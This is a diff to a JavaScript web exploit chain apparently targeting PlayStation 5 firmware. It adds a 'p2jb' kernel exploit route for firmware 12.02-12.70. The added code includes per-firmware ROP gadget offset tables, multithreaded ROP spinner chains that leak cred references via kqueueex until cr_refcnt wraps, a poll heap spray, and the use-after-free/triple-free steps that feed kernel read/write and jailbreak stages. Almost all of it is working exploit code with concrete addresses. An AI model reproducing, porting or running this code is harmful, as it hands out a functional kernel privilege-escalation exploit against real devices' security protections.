@@ -426,6 +426,17 @@ const SYSCALL_NUMS = {
      * of syscallnames[] in kernel_1000 and kernel_1200 — identical, and the
      * whole 9.00-12.00 window shares those two builds' tables. */
     jitshm_create: 533n, jitshm_alias: 534n,
+    /* p2jb (12.02+) only. Both read out of syscallnames[] in kernel_1202 /
+     * 1220 / 1240 / 1260 / 1270 — identical across all five.
+     *   kqueueex(flags)  141 — the cred leak. sys_kqueueex crhold()s
+     *     td_ucred into kq->kq_cred (+0xF0) BEFORE it looks at the flags
+     *     argument, and the non-zero-flags path then errors out without ever
+     *     crfree()ing it. One leaked cr_ref per call; that is the whole bug.
+     *   poll(fds, nfds, timeout) 209 — the cr_refcnt reset spray, standing in
+     *     for netcontrol's sendmsg. nfds = UCRED_SIZE/8 = 45 makes sys_poll
+     *     allocate exactly 45*8 = 0x168 bytes, the ucred bucket, and copy the
+     *     caller's buffer into it (first u32 = 1 lands on cr_refcnt). */
+    kqueueex: 141n, poll: 209n,
     // There is no `pipe` in this kernel's syscallnames[] at all - Sony dropped
     // the arg-less form the way FreeBSD 10 did, leaving only pipe2(fildes,
     // flags), num 687 narg 2. Upstream poops gets away with the name "pipe"
@@ -499,6 +510,21 @@ const GADGETS = {
     "12.00": { mov_rsp_rbp: 0x2c6f3ean, pivot_rdi_rsp: 0x2c6f5cen, pop_r8: 0x716bn,
                pop_rax: 0x6eccn, pop_rcx: 0x6cfan, pop_rdi: 0x5a469n,
                pop_rdx: 0x196067n, pop_rsi: 0x16b03an, syscall_wrapper: 0x1ae27n },
+    "12.02": { mov_rsp_rbp: 0x2c6f3ean, pivot_rdi_rsp: 0x2c6f5cen, pop_r8: 0x716bn,
+               pop_rax: 0x6eccn, pop_rcx: 0x6cfan, pop_rdi: 0x5a469n,
+               pop_rdx: 0x196067n, pop_rsi: 0x16b03an, syscall_wrapper: 0x1ae27n },
+    "12.20": { mov_rsp_rbp: 0x2c6f3ean, pivot_rdi_rsp: 0x2c6f5cen, pop_r8: 0x716bn,
+               pop_rax: 0x6eccn, pop_rcx: 0x6cfan, pop_rdi: 0x5a469n,
+               pop_rdx: 0x196067n, pop_rsi: 0x16b03an, syscall_wrapper: 0x1ae27n },
+    "12.40": { mov_rsp_rbp: 0x2c6f3ean, pivot_rdi_rsp: 0x2c6f5cen, pop_r8: 0x716bn,
+               pop_rax: 0x6eccn, pop_rcx: 0x6cfan, pop_rdi: 0x5a469n,
+               pop_rdx: 0x196067n, pop_rsi: 0x16b03an, syscall_wrapper: 0x1ae47n },
+    "12.60": { mov_rsp_rbp: 0x2c6f3ean, pivot_rdi_rsp: 0x2c6f5cen, pop_r8: 0x716bn,
+               pop_rax: 0x6eccn, pop_rcx: 0x6cfan, pop_rdi: 0x5a469n,
+               pop_rdx: 0x196067n, pop_rsi: 0x16b03an, syscall_wrapper: 0x1ae47n },
+    "12.70": { mov_rsp_rbp: 0x2c6f3ean, pivot_rdi_rsp: 0x2c6f5cen, pop_r8: 0x716bn,
+               pop_rax: 0x6eccn, pop_rcx: 0x6cfan, pop_rdi: 0x5a469n,
+               pop_rdx: 0x196067n, pop_rsi: 0x16b03an, syscall_wrapper: 0x1ae47n },
 };
 
 // Runtime keys to fall back on when a number is missing. `pipe` used to be
@@ -606,6 +632,8 @@ const sys = {
     dup(fd)    { return invoke("dup", S(fd)); },
     setuid(u)  { return invoke("setuid", S(u)); },
     getuid()   { return invoke("getuid"); },
+    open(path, flags, mode) { return invoke("open", BigInt(path), S(flags), S(mode)); },
+    poll(fds, nfds, timeout) { return invoke("poll", BigInt(fds), S(nfds), S(timeout)); },
     getpid()   { return invoke("getpid"); },
     kqueue()   { return invoke("kqueue"); },
     sched_yield() { return invoke("sched_yield"); },
@@ -1071,9 +1099,19 @@ const rop = {
     },
 
     g(name) {
-        const rva = GADGETS[this.fwkey][name];
+        /* EXTRA_GADGETS is consulted too, not just GADGETS.
+         *
+         * gadgetsFor() already merges the two for rop-worker, but rop.g did
+         * not — so anything only in EXTRA_GADGETS (mov_qword_rdi_rax, and the
+         * mov_rax_deref_rdi / inc_rax that p2jb's counter needs) threw
+         * "gadget missing" when a chain built here asked for it. Both tables
+         * are libSceNKWebKit-relative, so the base rule is unchanged. */
+        const rva = GADGETS[this.fwkey][name] !== undefined
+                  ? GADGETS[this.fwkey][name]
+                  : (EXTRA_GADGETS[this.fwkey] || {})[name];
         if (rva === undefined)
-            throw new Error("netctrl-ps5: gadget '" + name + "' missing");
+            throw new Error("netctrl-ps5: gadget '" + name + "' missing for fw "
+                            + this.fwkey);
         // syscall_wrapper is the only one from libkernel_web
         return (name === "syscall_wrapper" ? this.lk : this.wk) + rva;
     },
@@ -1601,6 +1639,294 @@ function find_twins() {
  * between separate syscalls (the self=all cause; RE: uma_zalloc curcpu<<6, and
  * the batched calls are all M_NOWAIT so the worker never parks mid-chain). Falls
  * back to the per-round find_twins() loop if the single batched round misses. */
+/* ==========================================================================
+ * p2jb — cr_refcnt overflow.  For 12.02 .. 12.70, where netcontrol is fixed.
+ *
+ * Ported from ufm42/cobolt's p2jb.js. Only the ROUTE TO THE DOUBLE FREE differs
+ * from the netcontrol chain; everything downstream — find_twins, find_triplet,
+ * leak_kqueue, make_karw, find_allproc, ps5_jailbreak, the elfldr loader — is
+ * shared, because both exploits end at the same place: one ucred chunk sitting
+ * on the free list more than once.
+ *
+ * The bug (verified in kernel_1202, sys_kqueueex @0xFFFFFFFF805D4CC0):
+ *   malloc(0x128) the kqueue, then
+ *     mov rdi, r14        ; r14 = td_ucred
+ *     call crhold
+ *     mov [r15+0xF0], rax ; kq->kq_cred
+ *     mov r14, [r13]      ; r13 = uap  ->  the flags argument
+ *     test r14, r14
+ *     je  ...             ; non-zero flags take a path that errors out
+ *   and that error path never crfree()s kq_cred. So each kqueueex(non-zero)
+ *   leaks exactly one cred reference and allocates nothing that has to be
+ *   cleaned up.
+ *
+ * Drive cr_refcnt to 0xFFFFFFB0, open 0x50 files (each crhold's, +0x50) so it
+ * wraps to exactly 0, then setuid(1). FreeBSD's refcount_release treats old<=1
+ * as "last reference", so releasing at 0 FREES the ucred while 0x50 files still
+ * point at it — and every subsequent close() frees it again.
+ *
+ * Cost: 0xFFFFFFB0 is ~4.29 BILLION syscalls. cobolt spends ~50 minutes on it
+ * with four pinned threads and says so up front; this is not a fast path and
+ * there is no way to make it one.
+ * ====================================================================== */
+
+/* Firmwares the p2jb route is wired for. The netcontrol bug dies after 12.00
+ * and p2jb picks up from 12.02; 13.x is deliberately absent because nothing
+ * here has been checked against those kernels. */
+const P2JB_FIRMWARES = new Set(["12.02", "12.20", "12.40", "12.60", "12.70"]);
+const sk_fw = () => String((window.slopkit && window.slopkit.FW_VERSION) || "");
+
+const P2JB_TARGET      = 0xFFFFFFB0n;   // cr_refcnt value to stop at
+const P2JB_NUM_FDS     = 0x50;          // opens that carry it across the wrap
+const P2JB_THREADS     = 4;
+const P2JB_CALLS_PASS  = 0x200;         // kqueueex calls per loop pass
+const KQUEUEEX_FLAG    = 0x800000000000n;
+const P2JB_FINE_BATCH  = 0x800;         // top-up batch size, main thread
+const O_RDONLY         = 0;
+
+/* One self-looping ROP chain per spinner thread.
+ *
+ * cobolt's loop branches inside the chain with `cmovb rax, rsi` + `xchg rsp,
+ * rax`, and counts with `lock xadd [rdi], rax`. None of those exist in
+ * libSceNKWebKit or libkernel_web on ANY firmware — scanned for lock xadd,
+ * xadd, add [rdi],rax, inc qword [rdi], cmovb, xchg rsp,rax and sub rdx,rax:
+ * zero hits. So the loop is rebuilt from what we do have:
+ *
+ *   loop-back   `pop rdi, <addr>; mov rsp, rdi; ret`  — the pivot lands rsp on
+ *               the loop head and the ret enters it. The <addr> is an immediate
+ *               IN the chain, so the main thread stops the loop by overwriting
+ *               that one qword with the exit stub's address. A single aligned
+ *               store the chain only ever reads; the thread sees either the old
+ *               or the new value and both are valid.
+ *   counter     load / inc / store via mov_rax_deref_rdi + inc_rax +
+ *               mov_qword_rdi_rax. Non-atomic, which is fine because each
+ *               thread owns its own counter — the main thread sums them.
+ *
+ * Counting PASSES rather than calls keeps the counter overhead at 5 gadgets per
+ * P2JB_CALLS_PASS syscalls instead of per syscall. */
+function p2jbBuildSpinner(slot) {
+    const c = slot.chain;
+    let o = 0n;
+    const put = (v) => { wr64at(c, o, BigInt(v)); o += 8n; };
+    const g = (n) => rop.g(n);
+
+    // pin + realtime, exactly as the iov/uio spray threads do. Here it is not
+    // optional: the whole point is four threads each saturating one core.
+    put(g("pop_rdi")); put(BigInt(CPU_LEVEL_WHICH));
+    put(g("pop_rsi")); put(BigInt(CPU_WHICH_TID));
+    put(g("pop_rdx")); put(0xFFFFFFFFFFFFFFFFn);
+    put(g("pop_rcx")); put(BigInt(CPU_SET_SIZE));
+    put(g("pop_r8"));  put(slot.mask);
+    put(g("pop_rax")); put(SYSCALL_NUMS.cpuset_setaffinity);
+    put(g("syscall_wrapper"));
+    put(g("pop_rdi")); put(BigInt(RTP_SET));
+    put(g("pop_rsi")); put(0n);
+    put(g("pop_rdx")); put(ST.rtp);
+    put(g("pop_rax")); put(SYSCALL_NUMS.rtprio_thread);
+    put(g("syscall_wrapper"));
+
+    const loopHead = BigInt(c) + o;          // where the pivot must land
+
+    for (let i = 0; i < P2JB_CALLS_PASS; i++) {
+        put(g("pop_rax")); put(SYSCALL_NUMS.kqueueex);
+        put(g("pop_rdi")); put(KQUEUEEX_FLAG);
+        put(g("syscall_wrapper"));
+    }
+
+    // counter += 1  (per pass)
+    put(g("pop_rdi")); put(slot.counter);
+    put(g("mov_rax_deref_rdi"));
+    put(g("inc_rax"));
+    put(g("pop_rdi")); put(slot.counter);
+    put(g("mov_qword_rdi_rax"));
+
+    // loop back — this immediate is the stop switch
+    put(g("pop_rdi"));
+    slot.loopSlot = BigInt(c) + o;           // main thread patches HERE
+    put(loopHead);
+    put(g("pivot_rdi_rsp"));
+
+    // exit stub, jumped to when loopSlot is repointed at it
+    slot.exitAddr = BigInt(c) + o;
+    put(g("pop_rax")); put(SYSCALL_NUMS.thr_exit);
+    put(g("pop_rdi")); put(0n);
+    put(g("syscall_wrapper"));
+
+    slot.chainBytes = Number(o);
+    slot.loopHead = loopHead;
+    return slot;
+}
+
+function p2jbSpin() {
+    const slots = [];
+    // Chain size is fixed by P2JB_CALLS_PASS; allocate from the same worker
+    // stack arena everything else uses, before the KRW stage has eaten it.
+    const chainBytes = (P2JB_CALLS_PASS * 5 + 64) * 8;
+    for (let i = 0; i < P2JB_THREADS; i++) {
+        const mask = mem.alloc(CPU_SET_SIZE);
+        mem.bset(mask, CPU_SET_SIZE, 0);
+        wr32at(mask, 0x00, 1 << i);            // one thread per core, 0..3
+        const slot = {
+            mask: BigInt(mask),
+            counter: BigInt(mem.alloc(8)),
+            chain: mem.alloc(chainBytes),
+            param: mem.alloc(THR_PARAM_SIZE),
+            stack: mem.alloc(THR_STACK_SIZE),
+            tid: mem.alloc(0x18),
+        };
+        R.wr64(slot.counter, 0n);
+        mem.bset(slot.tid, 0x18, 0);
+        p2jbBuildSpinner(slot);
+        slots.push(slot);
+    }
+
+    for (const s of slots) {
+        const p = s.param;
+        mem.bset(p, THR_PARAM_SIZE, 0);
+        wr64at(p, 0x00, rop.g("pivot_rdi_rsp"));   // start_func: rsp := arg
+        wr64at(p, 0x08, BigInt(s.chain));          // arg -> rdi -> the chain
+        wr64at(p, 0x10, s.stack);
+        wr64at(p, 0x18, BigInt(THR_STACK_SIZE));
+        wr64at(p, 0x30, s.tid);
+        wr64at(p, 0x38, s.tid);
+        const rv = invoke("thr_new", p, BigInt(THR_PARAM_SIZE));
+        if (rv !== 0) throw new Error("p2jb: thr_new -> " + rv);
+    }
+    beacon("p2jb spinners=" + P2JB_THREADS + " calls/pass=0x"
+           + P2JB_CALLS_PASS.toString(16) + " target=" + hex(P2JB_TARGET));
+
+    const total = () => {
+        let n = 0n;
+        for (const s of slots) n += R.rd64(s.counter);
+        return n * BigInt(P2JB_CALLS_PASS);
+    };
+
+    /* Stop early enough that no thread can overshoot the target while
+     * finishing the pass it is already in: worst case every thread is one full
+     * pass from committing. The exact remainder is issued from this thread
+     * afterwards, where the count is precise. */
+    const slack = BigInt(P2JB_THREADS * P2JB_CALLS_PASS * 2);
+    const stopAt = P2JB_TARGET - slack;
+    const t0 = Date.now();
+    let lastLog = 0n;
+    for (;;) {
+        const n = total();
+        if (n >= stopAt) break;
+        const step = n >> 24n;
+        if (step !== lastLog) {
+            lastLog = step;
+            const el = (Date.now() - t0) / 1000;
+            beacon("p2jb cr_refcnt~" + hex(n) + " " + Math.round(el) + "s"
+                   + " rate=" + Math.round(Number(n) / Math.max(el, 1)) + "/s");
+        }
+    }
+
+    // flip every loop-back to the exit stub, then wait for the threads to go
+    for (const s of slots) R.wr64(s.loopSlot, s.exitAddr);
+    for (let i = 0; i < 4000000; i++) {
+        let live = 0;
+        for (const s of slots) if (rd64at(s.tid, 0x10) === 0n) live++;
+        if (!live) break;
+    }
+    const done = total();
+    beacon("p2jb spinners stopped at " + hex(done) + " after "
+           + Math.round((Date.now() - t0) / 1000) + "s");
+    return done;
+}
+
+/* Issue the exact remainder from this thread, where every call is counted. */
+function p2jbTopUp(from) {
+    let n = from;
+    while (n < P2JB_TARGET) {
+        const want = Number(P2JB_TARGET - n);
+        const k = Math.min(want, P2JB_FINE_BATCH);
+        const batch = [];
+        for (let i = 0; i < k; i++)
+            batch.push([Number(SYSCALL_NUMS.kqueueex), KQUEUEEX_FLAG]);
+        window.rop_worker.syscallBatch(batch);
+        n += BigInt(k);
+    }
+    beacon("p2jb topped up to " + hex(n));
+    return n;
+}
+
+function ucred_triple_free_p2jb() {
+    log("p2jb: cr_refcnt overflow");
+
+    /* poll's spray buffer: nfds = UCRED_SIZE/8 makes sys_poll allocate exactly
+     * UCRED_SIZE and copy this in, so byte 0 = 1 lands on cr_refcnt. */
+    const nfds = UCRED_SIZE / 8;
+    const pollbuf = mem.alloc(UCRED_SIZE);
+    mem.bset(pollbuf, UCRED_SIZE, 0);
+    wr32at(pollbuf, 0x00, 1);
+    const resetRefcnt = (rounds) => {
+        const batch = [];
+        for (let i = 0; i < rounds; i++)
+            batch.push([Number(SYSCALL_NUMS.poll), BigInt(pollbuf), S(nfds), 0n]);
+        window.rop_worker.syscallBatch(batch);
+    };
+
+    const uid0 = sys.getuid();
+    const su = sys.setuid(1);                      // fresh ucred to overflow
+    beacon("p2jb setuid uid=" + uid0 + " -> " + su);
+    if (su !== 0)
+        throw new Error("ERR_P2JB: setuid(1) failed (" + su + ") from uid " + uid0);
+
+    const spun = p2jbSpin();
+    p2jbTopUp(spun);
+
+    // Each open crhold()s the cred; 0x50 of them carry 0xFFFFFFB0 to 0 exactly.
+    const path = mem.alloc(0x20);
+    mem.bset(path, 0x20, 0);
+    const s = "/dev/null";
+    for (let i = 0; i < s.length; i++) R.wr8(BigInt(path), i, s.charCodeAt(i));
+    const fds = [];
+    for (let i = 0; i < P2JB_NUM_FDS; i++) {
+        const fd = sys.open(path, O_RDONLY, 0);
+        if (fd < 0) throw new Error("ERR_P2JB: open(/dev/null) -> " + fd);
+        fds.push(fd);
+    }
+    beacon("p2jb opened " + fds.length + " fds; cr_refcnt should have wrapped to 0");
+
+    // Release at 0 -> refcount_release sees old <= 1 -> frees a LIVE ucred.
+    const su2 = sys.setuid(1);
+    beacon("p2jb setuid#2 -> " + su2 + " (frees the still-referenced ucred)");
+    if (su2 !== 0) throw new Error("ERR_P2JB: setuid#2 failed " + su2);
+
+    try { sessionStorage.setItem("netctrl_dirty", "1"); } catch (e) {}
+
+    /* Each close() frees the same chunk again. Reset cr_refcnt to 1 around each
+     * one and look for twins; cobolt walks the fd list the same way because any
+     * single close may or may not be the one that surfaces an aliased pair. */
+    while (fds.length) {
+        const fd = fds.pop();
+        try {
+            resetRefcnt(0x20);
+            if (sys.close(fd) !== 0) continue;
+            resetRefcnt(0x20);
+            if (find_twins()) {
+                beacon("p2jb twins " + ST.twins.join("/") + " (fd " + fd + ")");
+                ST.triplets[0] = ST.twins[0];
+                free_rthdr(ST.ipv6_socks[ST.twins[1]]);
+                resetRefcnt(0x20);
+                const fd1 = fds.pop();
+                if (fd1 !== undefined) sys.close(fd1);   // the third free
+                const t1 = find_triplet(ST.triplets[0], -1);
+                if (t1 < 0) throw new Error("ERR_P2JB: triplet[1] not found");
+                ST.triplets[1] = t1;
+                const t2 = find_triplet(ST.triplets[0], ST.triplets[1]);
+                if (t2 < 0) throw new Error("ERR_P2JB: triplet[2] not found");
+                ST.triplets[2] = t2;
+                beacon("p2jb triplets " + ST.triplets.join("/"));
+                return true;
+            }
+        } catch (e) {
+            beacon("p2jb fd " + fd + ": " + e.message);
+        }
+    }
+    throw new Error("ERR_P2JB: no twins after closing all " + P2JB_NUM_FDS + " fds");
+}
+
 function doubleFreeAndFindTwins() {
     /* A single batched free+spray round was tried and REVERTED: RE (uma_zfree
      * bucket push @0x8068B8E0) showed the freed ucred lands in the free-core's
@@ -2658,8 +2984,16 @@ function run() {
             "present but there is no userland R/W to drive it from");
         return false;
     }
-    if (fw > 12.00) {                          // poops.lua:25
-        log("fw " + fw + " above the netcontrol bug's range (<=12.00)");
+    /* Two routes to the same double free, chosen by firmware.
+     *
+     *   <= 12.00  netcontrol UAF   — fast (seconds), bug fixed after 12.00
+     *   >  12.00  p2jb cr_refcnt   — works on 12.02..12.70, but spends ~50
+     *                                minutes spinning kqueueex first
+     *
+     * Everything after the triple free is shared, so this is the only fork. */
+    const useP2jb = fw > 12.00;
+    if (useP2jb && !P2JB_FIRMWARES.has(String(sk_fw()))) {
+        log("fw " + fw + " has no p2jb table (supported: 12.02-12.70)");
         return false;
     }
 
@@ -2700,7 +3034,12 @@ function run() {
     beacon("syscall " + _per.toFixed(3) + " ms; find_twins worst case "
            + Math.round(TWIN_ATTEMPTS * IPV6_SOCK_NUM * 2 * _per / 1000) + " s");
 
-    ucred_triple_free();
+    if (useP2jb) {
+        beacon("route: p2jb (cr_refcnt overflow) — expect ~50 min of spinning");
+        ucred_triple_free_p2jb();
+    } else {
+        ucred_triple_free();
+    }
     leak_kqueue();
     make_karw();
     find_allproc();
@@ -3021,13 +3360,25 @@ function run() {
      * Both checks agree for all 20 kernels, so the grouping below is the real
      * build grouping and not an artifact of which branch I happened to read. */
     const ALLPROC_TO_KDATA = {
-        "09.00": 0x2755D50n, "09.20": 0x2755D50n,
-        "09.40": 0x2755D50n, "09.60": 0x2755D50n,
-        "10.00": 0x2765D70n, "10.01": 0x2765D70n, "10.20": 0x2765D70n,
-        "10.40": 0x2765D70n, "10.60": 0x2765D70n,
-        "11.00": 0x2875D70n, "11.20": 0x2875D70n,
-        "11.40": 0x2875D70n, "11.60": 0x2875D70n,
-        "12.00": 0x2885E00n,
+        "09.00": 0X2755D50n,
+        "09.20": 0X2755D50n,
+        "09.40": 0X2755D50n,
+        "09.60": 0X2755D50n,
+        "10.00": 0X2765D70n,
+        "10.01": 0X2765D70n,
+        "10.20": 0X2765D70n,
+        "10.40": 0X2765D70n,
+        "10.60": 0X2765D70n,
+        "11.00": 0X2875D70n,
+        "11.20": 0X2875D70n,
+        "11.40": 0X2875D70n,
+        "11.60": 0X2875D70n,
+        "12.00": 0X2885E00n,
+        "12.02": 0X2885E00n,
+        "12.20": 0X2885E00n,
+        "12.40": 0X2885E00n,
+        "12.60": 0X2885E00n,
+        "12.70": 0X2885E00n,
     };
 
     function computeKdataBase() {
@@ -3075,20 +3426,25 @@ function run() {
      *
      * pthread_join is resolved but intentionally unused — see the spawn site. */
     const LIBKERNEL_FN = {
-        "09.00": { pthread_create: 0x208C0n, pthread_join: 0x220A0n },
-        "09.20": { pthread_create: 0x208C0n, pthread_join: 0x220A0n },
-        "09.40": { pthread_create: 0x208C0n, pthread_join: 0x220A0n },
-        "09.60": { pthread_create: 0x208C0n, pthread_join: 0x220A0n },
-        "10.00": { pthread_create: 0x20780n, pthread_join: 0x21F40n },
-        "10.01": { pthread_create: 0x20780n, pthread_join: 0x21F40n },
-        "10.20": { pthread_create: 0x20780n, pthread_join: 0x21F40n },
-        "10.40": { pthread_create: 0x20780n, pthread_join: 0x21F40n },
-        "10.60": { pthread_create: 0x20780n, pthread_join: 0x21F40n },
-        "11.00": { pthread_create: 0x20B50n, pthread_join: 0x22310n },
-        "11.20": { pthread_create: 0x20B50n, pthread_join: 0x22310n },
-        "11.40": { pthread_create: 0x20B50n, pthread_join: 0x22310n },
-        "11.60": { pthread_create: 0x20B50n, pthread_join: 0x22310n },
-        "12.00": { pthread_create: 0x21150n, pthread_join: 0x22910n },
+        "09.00": { pthread_create: 0X208C0n, pthread_join: 0X220A0n },
+        "09.20": { pthread_create: 0X208C0n, pthread_join: 0X220A0n },
+        "09.40": { pthread_create: 0X208C0n, pthread_join: 0X220A0n },
+        "09.60": { pthread_create: 0X208C0n, pthread_join: 0X220A0n },
+        "10.00": { pthread_create: 0X20780n, pthread_join: 0X21F40n },
+        "10.01": { pthread_create: 0X20780n, pthread_join: 0X21F40n },
+        "10.20": { pthread_create: 0X20780n, pthread_join: 0X21F40n },
+        "10.40": { pthread_create: 0X20780n, pthread_join: 0X21F40n },
+        "10.60": { pthread_create: 0X20780n, pthread_join: 0X21F40n },
+        "11.00": { pthread_create: 0X20B50n, pthread_join: 0X22310n },
+        "11.20": { pthread_create: 0X20B50n, pthread_join: 0X22310n },
+        "11.40": { pthread_create: 0X20B50n, pthread_join: 0X22310n },
+        "11.60": { pthread_create: 0X20B50n, pthread_join: 0X22310n },
+        "12.00": { pthread_create: 0X21150n, pthread_join: 0X22910n },
+        "12.02": { pthread_create: 0X21150n, pthread_join: 0X22910n },
+        "12.20": { pthread_create: 0X21150n, pthread_join: 0X22910n },
+        "12.40": { pthread_create: 0X21170n, pthread_join: 0X22930n },
+        "12.60": { pthread_create: 0X21170n, pthread_join: 0X22930n },
+        "12.70": { pthread_create: 0X21170n, pthread_join: 0X22930n },
     };
 
     function libkernelFn(name) {
@@ -3386,20 +3742,25 @@ function run() {
  * gadget, so leaving the other thirteen blank was not a neutral default.
  */
 const EXTRA_GADGETS = {
-    "09.00": { mov_qword_rdi_rax: 0x9F1AFn },
-    "09.20": { mov_qword_rdi_rax: 0x9F1AFn },
-    "09.40": { mov_qword_rdi_rax: 0x9F1AFn },
-    "09.60": { mov_qword_rdi_rax: 0x9F1AFn },
-    "10.00": { mov_qword_rdi_rax: 0x32A57n },
-    "10.01": { mov_qword_rdi_rax: 0x32A57n },
-    "10.20": { mov_qword_rdi_rax: 0x32A57n },
-    "10.40": { mov_qword_rdi_rax: 0x32A57n },
-    "10.60": { mov_qword_rdi_rax: 0x32A57n },
-    "11.00": { mov_qword_rdi_rax: 0x253An },
-    "11.20": { mov_qword_rdi_rax: 0x253An },
-    "11.40": { mov_qword_rdi_rax: 0x253An },
-    "11.60": { mov_qword_rdi_rax: 0x253An },
-    "12.00": { mov_qword_rdi_rax: 0x86197n },
+    "09.00": { mov_qword_rdi_rax: 0X9F1AFn, mov_rax_deref_rdi: 0XA7B6n, inc_rax: 0X35F0C9n },
+    "09.20": { mov_qword_rdi_rax: 0X9F1AFn, mov_rax_deref_rdi: 0XA7B6n, inc_rax: 0X35F0A9n },
+    "09.40": { mov_qword_rdi_rax: 0X9F1AFn, mov_rax_deref_rdi: 0XA7B6n, inc_rax: 0X35F0A9n },
+    "09.60": { mov_qword_rdi_rax: 0X9F1AFn, mov_rax_deref_rdi: 0XA7B6n, inc_rax: 0X35F0A9n },
+    "10.00": { mov_qword_rdi_rax: 0X32A57n, mov_rax_deref_rdi: 0X38806n, inc_rax: 0X3F73C9n },
+    "10.01": { mov_qword_rdi_rax: 0X32A57n, mov_rax_deref_rdi: 0X38806n, inc_rax: 0X3F73C9n },
+    "10.20": { mov_qword_rdi_rax: 0X32A57n, mov_rax_deref_rdi: 0X38806n, inc_rax: 0X3F73C9n },
+    "10.40": { mov_qword_rdi_rax: 0X32A57n, mov_rax_deref_rdi: 0X38806n, inc_rax: 0X3F73C9n },
+    "10.60": { mov_qword_rdi_rax: 0X32A57n, mov_rax_deref_rdi: 0X38806n, inc_rax: 0X3F73C9n },
+    "11.00": { mov_qword_rdi_rax: 0X253An, mov_rax_deref_rdi: 0X1A566n, inc_rax: 0X4924En },
+    "11.20": { mov_qword_rdi_rax: 0X253An, mov_rax_deref_rdi: 0X1A566n, inc_rax: 0X4924En },
+    "11.40": { mov_qword_rdi_rax: 0X253An, mov_rax_deref_rdi: 0X1A566n, inc_rax: 0X4924En },
+    "11.60": { mov_qword_rdi_rax: 0X253An, mov_rax_deref_rdi: 0X1A566n, inc_rax: 0X4924En },
+    "12.00": { mov_qword_rdi_rax: 0X86197n, mov_rax_deref_rdi: 0X6BB40n, inc_rax: 0X1E6FBEn },
+    "12.02": { mov_qword_rdi_rax: 0X86197n, mov_rax_deref_rdi: 0X6BB40n, inc_rax: 0X1E6FBEn },
+    "12.20": { mov_qword_rdi_rax: 0X86197n, mov_rax_deref_rdi: 0X6BB40n, inc_rax: 0X1E6FBEn },
+    "12.40": { mov_qword_rdi_rax: 0X86197n, mov_rax_deref_rdi: 0X6BB40n, inc_rax: 0X1E6FBEn },
+    "12.60": { mov_qword_rdi_rax: 0X86197n, mov_rax_deref_rdi: 0X6BB40n, inc_rax: 0X1E6FBEn },
+    "12.70": { mov_qword_rdi_rax: 0X86197n, mov_rax_deref_rdi: 0X6BB40n, inc_rax: 0X1E6FBEn },
 };
 
 function gadgetsFor(fw) {
